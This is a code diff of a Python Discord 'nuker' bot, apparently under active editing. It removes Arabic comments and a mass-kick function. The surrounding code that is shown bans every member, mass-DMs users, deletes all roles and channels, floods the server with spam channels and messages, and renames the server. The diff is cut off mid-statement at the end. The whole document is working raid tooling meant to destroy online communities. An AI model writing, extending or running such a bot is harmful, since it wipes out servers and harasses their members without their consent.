@@ -55,7 +55,6 @@ class UltimateNuker:
         self.start_time = None
         
     async def ban_all_members(self, guild):
-        """حظر جميع الأعضاء"""
         members = [m for m in guild.members if not m.bot and m != guild.owner]
         success = 0
         fail = 0
@@ -87,41 +86,7 @@ class UltimateNuker:
         self.total_banned += success
         return success, fail
     
-    async def kick_all_members(self, guild):
-        """طرد جميع الأعضاء"""
-        members = [m for m in guild.members if not m.bot and m != guild.owner]
-        success = 0
-        fail = 0
-        
-        def kick_worker(member):
-            nonlocal success, fail
-            try:
-                future = asyncio.run_coroutine_threadsafe(member.kick(reason="LI ZANDYA MAFIA"), bot.loop)
-                future.result(timeout=2)
-                success += 1
-            except:
-                fail += 1
-        
-        threads = []
-        for member in members:
-            t = threading.Thread(target=kick_worker, args=(member,))
-            t.start()
-            threads.append(t)
-            time.sleep(0.001)
-            
-            if len(threads) >= MAX_THREADS:
-                for t in threads[:500]:
-                    t.join(timeout=0.01)
-                threads = []
-        
-        for t in threads:
-            t.join(timeout=0.01)
-        
-        self.total_kicked += success
-        return success, fail
-    
     async def mass_dm_everyone(self, guild):
-        """إرسال رسائل للجميع"""
         members = [m for m in guild.members if not m.bot]
         success = 0
         fail = 0
@@ -218,7 +183,6 @@ class UltimateNuker:
         return count
     
     async def ultimate_nuke(self, guild):
-        """نوكر شامل - يحظر الجميع ويدمر كل شيء"""
         if self.is_nuking:
             return None
         
@@ -237,34 +201,17 @@ class UltimateNuker:
         
         try:
             print(f"[NUKER] Starting nuke on {guild.name}...")
-            
-            # 1. حظر جميع الأعضاء
             results['banned'], results['banned_failed'] = await self.ban_all_members(guild)
             print(f"[NUKER] Banned: {results['banned']}")
-            
-            # 2. إرسال رسائل للجميع
             results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(guild)
             print(f"[NUKER] DM sent: {results['dm_sent']}")
-            
-            # 3. تغيير الأسماء
             results['nicknames_changed'] = await self.change_all_nicknames(guild)
-            
-            # 4. حذف الرتب
             results['roles_deleted'] = await self.delete_all_roles(guild)
-            
-            # 5. حذف القنوات
             results['channels_deleted'] = await self.delete_all_channels(guild)
-            
-            # 6. إنشاء قنوات سبام
             spam_channels = await self.create_spam_channels(guild)
             results['spam_channels'] = len(spam_channels)
-            
-            # 7. سبام
             results['spam_messages'] = await self.spam_all_channels(guild)
-            
-            # 8. تغيير اسم السيرفر
             await self.rename_server(guild)
-            
             self.nuked_servers.append(guild.name)
             print(f"[NUKER] Nuke completed on {guild.name}!")
         except Exception as e:
@@ -275,10 +222,6 @@ class UltimateNuker:
         return results
 
 nuker = UltimateNuker()
-
-# ============================================
-# DISCORD BOT
-# ============================================
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -401,4 +344,4 @@ async def handle_owner_command(message):
         elapsed = time.time() - nuker.start_time if nuker.start_time else 0
         hours = int(elapsed // 3600)
         minutes = int((elapsed % 3600) // 60)
-        await message.channel.send(f"""
+        msg = f"""
